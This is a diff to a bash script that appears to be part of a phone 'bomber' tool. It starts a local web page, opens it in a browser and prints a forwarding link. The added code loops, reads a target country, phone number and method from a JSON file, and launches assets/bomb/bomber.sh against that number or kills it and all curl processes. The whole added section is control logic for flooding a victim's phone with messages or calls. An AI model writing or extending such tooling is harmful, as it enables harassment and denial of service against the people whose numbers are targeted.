@@ -102,7 +102,7 @@ while read -r N; do
 done < $CWD/assets/logger2 > $CWD/assets/index.html
 rm -rf $CWD/assets/logger2 >/dev/null 2>&1
 #declare some variables
-NUM="$CWD/assets/php/num.txt"
+NUM="$CWD/assets/php/result.txt"
 if [ ! -d $CWD/logs ]; then
     mkdir logs > /dev/null 2>&1
 else
@@ -131,3 +131,26 @@ printf "\n${S2}[${S5}+${S2}] ${S4}Login servet started at ${S1}:: ${S2}http://12
 xdg-open http://127.0.0.1:4444
 printf "\n${S2}[${S5}+${S2}] ${S4}Forwarding session at ${S1}:: ${S2}$link ${R0}\n"
 #<<<CheckFound and Start the Bomber>>>#
+bombControl() {
+    CTRY="$1"
+    PHONE="$2"
+    METH="$3"
+    if [[ ${METH,,} == 'bomb' ]]; then
+        bash assets/bomb/bomber.sh "$CTRY" "$PHONE" "$METH"
+    else
+        PD=$(ps aux | grep bomber.sh | awk '{print $2}')
+        kill $PD >/dev/null 2>&1
+        killall curl >/dev/null 2>&1
+    fi
+}
+while true; do
+    if [ -f $CWD/assets/php/result.txt ]; then
+        CNTRY=$(cat $NUM | jq -r .info[].country)
+        NMBER=$(cat $NUM | jq -r .info[].number)
+        Method=$(cat $NUM | jq -r .info[].method)
+        rm -rf $NUM >/dev/null 2>&1
+        bombControl "$CNTRY" "$NMBER" "$Method"
+    else
+        sleep 0.3
+    fi
+done
